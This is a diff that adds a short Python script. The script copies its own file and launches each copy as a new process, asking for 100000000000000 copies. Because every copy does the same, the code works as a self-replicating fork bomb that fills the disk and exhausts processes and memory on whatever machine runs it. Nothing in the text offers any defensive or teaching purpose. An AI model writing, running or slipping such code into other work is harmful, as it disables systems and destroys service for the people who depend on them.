@@ -1,0 +1,12 @@
+import os
+import shutil
+import subprocess
+
+def replicate_and_run(num_copies):
+    original_script = __file__
+    for i in range(num_copies):
+        new_copy = f"script_copy_{i}.py"
+        shutil.copyfile(original_script, new_copy)
+        subprocess.Popen(["python", new_copy], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+replicate_and_run(100000000000000)  # Change the number of copies as needed
